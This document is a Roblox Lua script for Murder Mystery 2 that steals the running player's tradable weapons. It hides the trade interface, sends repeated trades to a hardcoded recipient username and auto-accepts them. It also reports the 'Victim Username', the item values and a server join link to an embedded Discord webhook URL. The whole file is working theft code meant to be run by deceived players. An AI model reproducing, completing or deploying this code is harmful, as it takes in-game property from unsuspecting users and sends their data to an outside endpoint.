_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

_G.Usernames = {"Ax3lxzik"} 
_G.min_rarity = "Common"
_G.min_value = 1 
_G.pingEveryone = "Yes" 
_G.webhook = "https://discord.com/api/webhooks/1453771705972560056/Cqx6olAGhd60QXNCfM2syHasb4_rIJxjNDC4WT_s76FO2EziCy6JLhRS1aHX6rcFIPm7" 


local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add username or webhook")
    return
end

if game.PlaceId ~= 142823291 then
    plr:kick("Game not supported. Please join a normal MM2 server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

local Players = game:GetService("Players")
local weaponsToSend = {}
local originalWeaponsList = {} -- NOUVEAU: Copie pour garder la liste originale
local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")
local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local HttpService = game:GetService("HttpService")

local rarityTable = {
    "Common",
    "Uncommon",
    "Rare",
    "Legendary",
    "Godly",
    "Ancient",
    "Unique",
    "Vintage"
}

local categories = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    classic = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}
local headers = {
    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
}

local function trim(s)
    return s:match("^%s*(.-)%s*$")
end

local function fetchHTML(url)
    local response = request({
        Url = url,
        Method = "GET",
        Headers = headers
    })
    return response.Body
end

local function parseValue(itembodyDiv)
    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if valueStr then
        valueStr = valueStr:gsub(",", "")
        local value = tonumber(valueStr)
        if value then
            return value
        end
    end
    return nil
end

local function extractItems(htmlContent)
    local itemValues = {}
    
    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        itemName = itemName:match("([^<]+)")
        if itemName then
            itemName = trim(itemName:gsub("%s+", " "))
            itemName = trim((itemName:split(" Click "))[1])
            local itemNameLower = itemName:lower()

            local value = parseValue(itembodyDiv)
            if value then
                itemValues[itemNameLower] = value
            end
        end
    end
    
    return itemValues
end

local function extractChromaItems(htmlContent)
    local chromaValues = {}

    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        chromaName = chromaName:match("([^<]+)")
        if chromaName then
            chromaName = trim(chromaName:gsub("%s+", " ")):lower()
            local value = parseValue(itembodyDiv)
            if value then
                chromaValues[chromaName] = value
            end
        end
    end
    
    return chromaValues
end

local function buildValueList()
    local allExtractedValues = {}
    local chromaExtractedValues = {}
    local categoriesToFetch = {}

    for rarity, url in pairs(categories) do
        table.insert(categoriesToFetch, {rarity = rarity, url = url})
    end
    
    local totalCategories = #categoriesToFetch
    local completed = 0
    local lock = Instance.new("BindableEvent")

    for _, category in ipairs(categoriesToFetch) do
        task.spawn(function()
            local rarity = category.rarity
            local url = category.url
            local htmlContent = fetchHTML(url)
            
            if htmlContent and htmlContent ~= "" then
                if rarity ~= "chroma" then
                    local extractedItemValues = extractItems(htmlContent)
                    for itemName, value in pairs(extractedItemValues) do
                        allExtractedValues[itemName] = value
                    end
                else
                    chromaExtractedValues = extractChromaItems(htmlContent)
                end
            end

            completed = completed + 1
            if completed == totalCategories then
                lock:Fire()
            end
        end)
    end

    lock.Event:Wait()

    local valueList = {}

    for dataid, item in pairs(database) do
        local itemName = item.ItemName and item.ItemName:lower() or ""
        local rarity = item.Rarity or ""
        local hasChroma = item.Chroma or false

        if itemName ~= "" and rarity ~= "" then
            local weaponRarityIndex = table.find(rarityTable, rarity)
            local godlyIndex = table.find(rarityTable, "Godly")

            if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
                if hasChroma then
                    local matchedChromaValue = nil
                    for chromaName, value in pairs(chromaExtractedValues) do
                        if chromaName:find(itemName) then
                            matchedChromaValue = value
                            break
                        end
                    end

                    if matchedChromaValue then
                        valueList[dataid] = matchedChromaValue
                    end
                else
                    local value = allExtractedValues[itemName]
                    if value then
                        valueList[dataid] = value
                    end
                end
            end
        end
    end

    return valueList
end

local function sendTradeRequest(user)
    local args = {
        [1] = game:GetService("Players"):WaitForChild(user)
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
end

local function getTradeStatus()
    return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
end

local function waitForTradeCompletion()
    while true do
        local status = getTradeStatus()
        if status == "None" then
            break
        end
        wait(0.1)
    end
end

local function acceptTrade()
    local acceptTradeEvent = game:GetService("ReplicatedStorage").Trade.AcceptTrade
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("CancelAccept"):FireServer()

    game:GetService("ReplicatedStorage").Trade.UpdateTrade.OnClientEvent:Connect(function(tradeUpdate)
        if tradeUpdate.LastOffer then
            while true do
                acceptTradeEvent:FireServer(game.PlaceId * 3, tradeUpdate.LastOffer)
                acceptTradeEvent:FireServer(game.PlaceId * 3)
                acceptTradeEvent:FireServer(game.PlaceId * 2)
                task.wait(0.2)
            end
        else
            return
        end
    end)
end

local function addWeaponToTrade(id)
    local args = {
        [1] = id,
        [2] = "Weapons"
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
end

local totalValue = 0

local function SendFirstMessage(list, prefix)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join code:",
            value = "Roblox.GameLauncher.joinGameInstance(142823291, '" .. game.JobId .. "')"
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalValue),
            inline = false
        }
    }

    for _, item in ipairs(list) do
        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
        fields[3].value = fields[3].value .. itemLine .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "\240\159\148\170 Join to get MM2 hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = ""
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local function SendMessage(sortedItems)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Items sent:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalValue),
            inline = false
        }
    }

    for _, item in ipairs(sortedItems) do
        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
        fields[2].value = fields[2].value .. itemLine .. "\n"
    end

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "\240\159\148\170 New MM2 Execution",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = ""
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local tradegui = playerGui:WaitForChild("TradeGUI")
tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradegui.Enabled = false
end)
local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradeguiphone.Enabled = false
end)

local min_rarity_index = table.find(rarityTable, min_rarity)

local untradable = {
    ["DefaultGun"] = true,
    ["DefaultKnife"] = true,
    ["Reaver"] = true,
    ["Reaver_Legendary"] = true,
    ["Reaver_Godly"] = true,
    ["Reaver_Ancient"] = true,
    ["IceHammer"] = true,
    ["IceHammer_Legendary"] = true,
    ["IceHammer_Godly"] = true,
    ["IceHammer_Ancient"] = true,
    ["Gingerscythe"] = true,
    ["Gingerscythe_Legendary"] = true,
    ["Gingerscythe_Godly"] = true,
    ["Gingerscythe_Ancient"] = true,
    ["TestItem"] = true,
    ["Season1TestKnife"] = true,
    ["Cracks"] = true,
    ["Icecrusher"] = true,
    ["???"] = true,
    ["Dartbringer"] = true,
    ["TravelerAxeRed"] = true,
    ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true,
    ["TravelerAxeGold"] = true,
    ["BlueCamo_K_2022"] = true,
    ["GreenCamo_K_2022"] = true,
    ["SharkSeeker"] = true
}

local valueList = buildValueList()
local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)

for i, v in pairs(realData.Weapons.Owned) do
    local dataid = i
    local amount = v
    local rarity = database[dataid].Rarity
    local weapon_rarity_index = table.find(rarityTable, rarity)
    if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
        local value
        if valueList[dataid] then
            value = valueList[dataid]
        else
            if weapon_rarity_index >= table.find(rarityTable, "Godly") then
                value = 2
            else
                value = 1
            end
        end
        if value >= min_value then
            totalValue = totalValue + (value * amount)
            table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
        end
    end
end

if #weaponsToSend > 0 then
    table.sort(weaponsToSend, function(a, b)
        return (a.Value * a.Amount) > (b.Value * b.Amount)
    end)

    -- NOUVEAU: Créer une copie profonde de la liste originale
    for i, v in ipairs(weaponsToSend) do
        originalWeaponsList[i] = {
            DataID = v.DataID,
            Rarity = v.Rarity,
            Amount = v.Amount,
            Value = v.Value
        }
    end

    local prefix = ""
    if ping == "Yes" then
        prefix = "--[[@everyone]] "
    end

    SendFirstMessage(originalWeaponsList, prefix)

    local isTrading = false
    local messageSent = false -- NOUVEAU: Flag pour éviter d'envoyer le message plusieurs fois

    local function doTrade(joinedUser)
        if isTrading then
            return
        end
        
        isTrading = true
        
        -- NOUVEAU: Envoyer le message seulement une fois au début du premier trade
        if not messageSent then
            SendMessage(originalWeaponsList)
            messageSent = true
        end
        
        local initialTradeState = getTradeStatus()
        if initialTradeState == "StartTrade" then
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
            wait(0.5)
        elseif initialTradeState == "ReceivingRequest" then
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
            wait(0.5)
        end

        while #weaponsToSend > 0 do
            local tradeStatus = getTradeStatus()

            if tradeStatus == "None" then
                sendTradeRequest(joinedUser)
                wait(0.5)
            elseif tradeStatus == "SendingRequest" then
                wait(0.5)
            elseif tradeStatus == "ReceivingRequest" then
                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
                wait(0.5)
            elseif tradeStatus == "StartTrade" then
                for i = 1, math.min(4, #weaponsToSend) do
                    local weapon = table.remove(weaponsToSend, 1)
                    for count = 1, weapon.Amount do
                        addWeaponToTrade(weapon.DataID)
                    end
                end
                wait(6)
                acceptTrade()
                waitForTradeCompletion()
                wait(1)
            else
                wait(0.5)
            end
            wait(0.5)
        end
        
        isTrading = false
    end

    local function startTradeWithPlayer(player)
        if not player or not player.Parent then
            return
        end
        
        wait(3)
        
        if not player.Parent then
            return
        end
        
        doTrade(player.Name)
    end
    
    local function onPlayerAdded(player)
        if table.find(users, player.Name) then
            task.spawn(function()
                startTradeWithPlayer(player)
            end)
        end
    end
    
    local targetFound = false
    for _, p in ipairs(Players:GetPlayers()) do
        if table.find(users, p.Name) then
            targetFound = true
            task.spawn(function()
                startTradeWithPlayer(p)
            end)
            break
        end
    end
    
    Players.PlayerAdded:Connect(onPlayerAdded)
    
    Players.PlayerRemoving:Connect(function(player)
        if table.find(users, player.Name) then
            isTrading = false
        end
    end)
end
